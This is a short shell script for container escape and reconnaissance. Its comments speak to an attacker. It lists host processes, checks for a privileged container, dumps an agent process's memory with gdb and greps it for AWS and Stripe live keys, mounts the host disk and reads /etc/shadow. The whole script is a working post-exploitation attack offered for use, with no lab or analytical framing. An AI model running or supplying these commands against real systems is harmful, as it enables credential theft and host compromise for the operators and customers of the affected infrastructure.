
echo "--- STARTING ISOLATION RECON ---"
echo "[*] Checking for neighboring processes..."
ps aux --forest || ps -ef
# If you see processes like 'mysql', 'docker-proxy', or names of other apps, 
# isolation is broken.


echo "[*] Checking Linux Capabilities..."
capsh --print 2>/dev/null || cat /proc/self/status | grep Cap
# If you see '000001ffffffffff', you are in a privileged container—the ultimate gift for an attacker.

echo "--- RECON COMPLETE ---"

echo "Host Recon"
# Look for processes with "build", "worker", or "wrangler" in the name
cat /proc/*/cmdline | tr '\0' ' ' | grep "wrangler"

echo "Search the memory of the cc-vm-agent (PID 236) for common secret patterns"
# (Requires root/CAP_SYS_PTRACE which you have in your bounding set)
gdb -p 236 --batch -ex "generate-core-file"
strings core.236 | grep -E "(AWS_ACCESS_KEY|STRIPE_|sk_live)"
ls -l /dev/ | grep -E 'sd|nvme|vd'
mkdir /tmp/host_root
mount /dev/sda1 /tmp/host_root
ls /tmp/host_root/etc/shadow

